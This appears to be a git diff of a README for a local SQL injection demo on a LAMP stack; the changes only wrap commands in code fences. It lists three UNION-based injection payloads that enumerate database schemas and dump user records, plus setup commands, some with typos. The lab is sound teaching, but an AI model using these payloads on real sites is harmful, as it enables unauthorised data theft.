@@ -36,15 +36,15 @@ Steps to Implement this program:- ( For Windows users)
     
    Now type some queries given below:-
 
-   1. a' and 1=0 union select table_schema, table_type, table_catalog from information_schema.tables;#
+   1. ```a' and 1=0 union select table_schema, table_type, table_catalog from information_schema.tables;#```
    
    <img src = "screenshots/Screenshot from 2019-10-03 00-29-45.png" height = 500 width  = 900/>
    
    Output:-
      <img src = "screenshots/Screenshot from 2019-10-03 00-30-45.png" height = 500 width  = 900/>
 
-   2. a' and 1=0 union select table_schema, table_type, table_catalog from information_schema.tables 
-      where table_name like 'user%';#
+   2. ```a' and 1=0 union select table_schema, table_type, table_catalog from information_schema.tables 
+      where table_name like 'user%';#```
       
         <img src = "screenshots/Screenshot from 2019-10-03 00-31-57.png" height = 500 width  = 900/>
         
@@ -52,7 +52,7 @@ Steps to Implement this program:- ( For Windows users)
           <img src = "screenshots/Screenshot from 2019-10-03 00-32-01.png" height = 500 width  = 900/>
      
 
-   3. a' and 1=0 union select concat_WS(':', name), concat_WS(':', srno, city), name, city from user;#
+   3. ```a' and 1=0 union select concat_WS(':', name), concat_WS(':', srno, city), name, city from user;#```
    
      <img src = "screenshots/Screenshot from 2019-10-03 00-34-12.png" height = 500 width  = 900/>
      
@@ -68,21 +68,25 @@ Setting up LAMP(Linux, Apache, Mysql, PHP):-
 
 2. Further, you have to install :-
   Apache
-  Command = apt-get install apache2
+  Command:-
+  ```apt-get install apache2```
   Mysql
-  Command = apt-get install mysql -server
+  Command:-
+  ```apt-get install mysql -server```
   pHp
-  Command = apt-get install php7.2 libapache-mod-php7.2php-mysql
+  Command:-
+  ```apt-get install php7.2 libapache-mod-php7.2php-mysql```
   PhpMyAdmin
-  Command = apt-get install phpmyadmin
+  Command:- 
+  ```apt-get install phpmyadmin```
 
 3. Now ,you have to follow some mysql commands:-
   Create database:-
-    Create database project;
+    ```Create database project;```
   Select the created database:-
-    use project;
+    ```use project;```
   Create table in database:-
-    create table users(srno int(5) primary key, name  varchar(30), city varchar(30));
+    ```create table users(srno int(5) primary key, name  varchar(30), city varchar(30));```
 
 4. Now gitclone those 2 pages(project.html and projectdb.php) and copy them at following path:-
    var/www/html
